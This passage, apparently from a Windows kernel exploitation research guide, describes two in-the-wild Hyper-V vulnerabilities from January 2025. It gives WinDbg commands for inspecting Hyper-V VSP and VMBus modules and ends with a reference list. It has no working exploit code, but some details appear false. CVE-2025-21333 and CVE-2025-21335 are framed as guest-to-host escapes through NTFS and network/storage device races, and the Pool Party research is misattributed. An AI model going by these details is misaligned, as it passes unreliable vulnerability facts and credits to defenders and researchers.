Two in-the-wild Hyper-V kernel exploits patched in the January 2025 Patch Tuesday
represent a significant escalation in exploitation target sophistication.

**CVE-2025-21333 — Hyper-V NTFS guest escape**:

- **Target**: Guest NTFS driver (`ntfs.sys`) as seen from inside a Hyper-V guest VM
- **Method**: A vulnerability in the guest's NTFS driver processing of file system
  operations that cross the Hyper-V synthetic storage boundary
- **Impact**: Guest → Host SYSTEM. The attack escapes from the VM guest context to
  execute code in the host kernel (the Hyper-V root partition)
- **Significance**: Guest-to-host escape via a Windows file system driver (not the
  hypervisor itself) demonstrates the attack surface extends beyond the VMBus and
  VSP/VSC interfaces

**CVE-2025-21335 — Hyper-V VSP UAF**:

- **Target**: Hyper-V Virtual Service Provider (VSP) — the host-side component of
  synthetic device emulation
- **Method**: UAF in the VSP layer when handling a guest-initiated disconnect/reconnect
  race on a synthetic network or storage device
- **Impact**: Guest → Host SYSTEM via VSP code running in the root partition kernel

**Research implications**: Hyper-V escape research requires access to the Hyper-V
VSP/VSC interface, which is documented only partially. Key analysis tools:

```windbg
; On Hyper-V host (root partition):
; List Hyper-V VSP objects
lm m hvax64        ; Hyper-V hypervisor extension
lm m vmbus         ; VMBus driver
lm m storvsp       ; Storage VSP
lm m netvsp        ; Network VSP

; VSP IRP dispatch (storvsp example)
x storvsp!*Dispatch*

; VMBus channel structures
dt vmbus!_VMBUS_CHANNEL [addr]
```

---

## References

[R-1] Windows Internals Part 1 & 2, 7th Edition — Yosifovich, Ionescu, Russinovich, Solomon
  — https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals

[R-2] HackSys Extreme Vulnerable Driver (HEVD)
  — HackSysTeam — https://github.com/hacksysteam/HackSysExtremeVulnerableDriver

[R-3] One I/O Ring to Rule Them All: A New Attack Primitive on Windows 11
  — Yarden Shafir — https://windows-internals.com/one-io-ring-to-rule-them-all-a-new-attack-primitive-on-windows-11/

[R-4] Pool Party: Abusing Windows Worker Factories for Code Injection and Privilege Escalation
  — Yarden Shafir (SafeBreach) — https://i.blackhat.com/BH-US-23/Presentations/US-23-Shafir-PoolParty-A-Novel-Process-Injection-Technique.pdf

[R-5] Bochspwn Reloaded: Detecting Kernel Memory Disclosure with x86 Emulation
  — j00ru (Mateusz Jurczyk) — https://j00ru.vexillium.org/talks/blackhat17-bochspwn-reloaded/

[R-6] Analysis and Deep Dive into CVE-2021-1732
  — Google Project Zero — https://googleprojectzero.blogspot.com/2021/01/analysis-and-deep-dive-into-cve-2021.html

[R-7] Win32k.sys Vulnerability Research
  — j00ru — https://j00ru.vexillium.org/

[R-8] Vergilius Project — Windows kernel structure definitions by build
  — https://www.vergiliusproject.com/

[R-9] FudModule v2: A Deep Dive into CVE-2024-21338
  — Avast Threat Research — https://decoded.avast.io/

[R-10] CVE-2024-38193: Lazarus Group Exploits AFD.sys UAF
  — ESET Research / Avast — https://www.welivesecurity.com/

[R-11] CVE-2024-30051: Desktop Window Manager UAF Used by QakBot
  — Kaspersky SecureList, DBAPPSecurity — https://securelist.com/

[R-12] Windows 11 24H2 Segment Heap Hardening Analysis
  — Vergilius Project build 26100 structures — https://www.vergiliusproject.com/kernels/x64/Windows%2011%2024H2

[R-13] HEVD v3.x ARM64 Support and New Vulnerability Classes
  — HackSysTeam — https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases

[R-14] Pool Party Variants Viability Analysis Post-24H2
  — SafeBreach Labs — https://www.safebreach.com/

[R-15] NtQuerySystemInformation Class Audit 2024
  — j00ru Kernel Exploitation Blog — https://j00ru.vexillium.org/
